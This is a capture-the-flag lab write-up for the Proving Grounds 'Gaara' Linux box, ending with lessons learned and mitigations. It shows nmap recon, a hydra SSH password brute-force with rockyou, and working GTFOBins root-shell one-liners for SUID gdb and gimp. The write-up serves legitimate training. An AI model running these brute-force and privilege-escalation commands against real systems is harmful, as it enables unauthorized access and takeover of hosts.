<!-- writeup-meta
title: Gaara
platform: Proving Grounds Play
os: Linux
difficulty: Easy
ip: 192.168.131.142
date: 2026-10-17
tags:
  - writeup
  - linux
  - brute-force
  - suid
  - privesc
-->
# Gaara

> [!NOTE]
> **TL;DR** — The website is a single themed page with nothing to attack, so the box opens with an SSH password guess against the username the theme hands you: `gaara`. A SUID `gdb` binary then gives a root shell via GTFOBins.
>
> **Path:** web dead end → SSH password guess (`gaara`) → SUID `gdb` → root

## 1. Recon

### 1.1 Nmap

```shellsession
$ nmap -Av -sS -p- 192.168.131.142
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1f:e2:3f:d1:88:76:d3:4a:b0:89:0e:b9:ab:93:27:00 (RSA)
|   256 02:89:e5:89:c2:32:f5:b5:16:a6:5d:f1:b9:d1:0c:23 (ECDSA)
|_  256 67:b1:f5:c6:dc:7e:0b:74:53:75:0c:6c:02:40:3b:46 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
```

**Open ports / services:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 22 | SSH | OpenSSH 7.9p1 | Weak-password candidate once a username is known |
| 80 | HTTP | Apache 2.4.38 | Only content is a single themed page |

> [!NOTE]
> **Reasoning:** Two ports, and the web app is a single static page. With no web foothold, SSH becomes the likely way in — and the box name itself is a strong hint at the username.

### 1.2 Web enumeration

The site is one page: a Gaara splash image with an email signature (`dpuwrijaya@yahoo.com`) in the corner.

![](img/1.png)

I pulled the background image and checked it for hidden data — nothing stuck:

```shellsession
$ file gaara.jpg
$ exiftool gaara.jpg
$ strings gaara.jpg
$ steghide info gaara.jpg
```

Directory brute-forcing came up empty too:

```shellsession
$ gobuster dir -u http://192.168.131.142/ \
> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
(no results)
```

> [!WARNING]
> **Rabbit hole:** steganography on the splash image. `file`, `exiftool`, `strings` and `steghide` all came back clean — the image is just the theme, not a carrier. Don't force a stego angle when nothing points to it.

## 2. Foothold

With the web surface exhausted, the only remaining service is SSH. The box is themed entirely around Gaara, so `gaara` is the obvious username to try. I guessed it against `rockyou.txt`:

```shellsession
$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.131.142
[DATA] attacking ssh://192.168.131.142/
[22][ssh] host: 192.168.131.142   login: gaara   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
```

The credentials logged in:

```shellsession
$ ssh gaara@192.168.131.142
gaara@lab-pg-debian10-gaara-244-081:~$ id
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
```

- **Initial access as:** `gaara`
- **local.txt:** `[REDACTED]`

## 3. Privilege Escalation

### 3.1 Enumeration — SUID binaries

```shellsession
gaara@lab-pg-debian10-gaara-244-081:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

Two non-standard entries jump out: **`gimp-2.10`** and **`gdb`**. Both have SUID techniques on GTFOBins.

### 3.2 Exploitation

**gimp — failed.** The GTFOBins SUID method runs a Python one-liner through GIMP's batch interpreter:

```shellsession
$ ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
Cannot open display:
```

GIMP's `python-fu` needs an X display, which a plain SSH session doesn't have — dead end.

**gdb — worked.** `gdb` already carries the SUID bit, so there's no need to make a copy; run it straight from its path with the GTFOBins payload:

```shellsession
gaara@lab-pg-debian10-gaara-244-081:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

### 3.3 Root

```shellsession
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
# cat /root/proof.txt
[REDACTED]
```

- **Escalated to:** `root` (euid=0)
- **proof.txt:** `[REDACTED]`

> [!TIP]
> **Why it works:** `gdb` runs SUID-root, and launching `sh -p` keeps the elevated **effective** UID instead of dropping it. That's why `id` shows `uid=1001` but `euid=0` — an effective-root shell, which is enough to read `/root`.

## 4. Lessons Learned

- **Let the theme name the user.** The whole box is Gaara-themed, and `gaara` was the valid SSH username. On CTF-style boxes the username is often in plain sight — the hostname, the page title, the artwork.

- **A password guess is a legitimate step when nothing else is there.** One static page and an empty gobuster meant SSH was the only door; a known username against `rockyou` was enough.

- **Know when a stego trail is cold.** Clean `file` / `exiftool` / `strings` / `steghide` output means move on — no point sinking more time into the image.

- **SUID GIMP needs a display.** The `python-fu` method silently depends on X, so it can't run over SSH. Reach for a GTFOBins binary that doesn't need a GUI — `gdb` here.

- **New technique for my notes:** SUID `gdb` → `sh -p` root shell. → privesc-linux

## 5. Mitigation

- **Weak SSH password:** the `gaara` account password is a top entry in `rockyou`. Enforce strong passwords, rate-limit logins (e.g. `fail2ban`), and prefer key-based auth with password login disabled.

- **Unnecessary SUID binaries:** neither `gdb` nor `gimp-2.10` should carry the SUID bit. Strip it (`chmod -s`) from any debugger or interpreter — they map straight to root via GTFOBins.

## References

- [GTFOBins — gdb (SUID)](https://gtfobins.github.io/gtfobins/gdb/#suid)
- [GTFOBins — gimp (SUID)](https://gtfobins.github.io/gtfobins/gimp/#suid)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
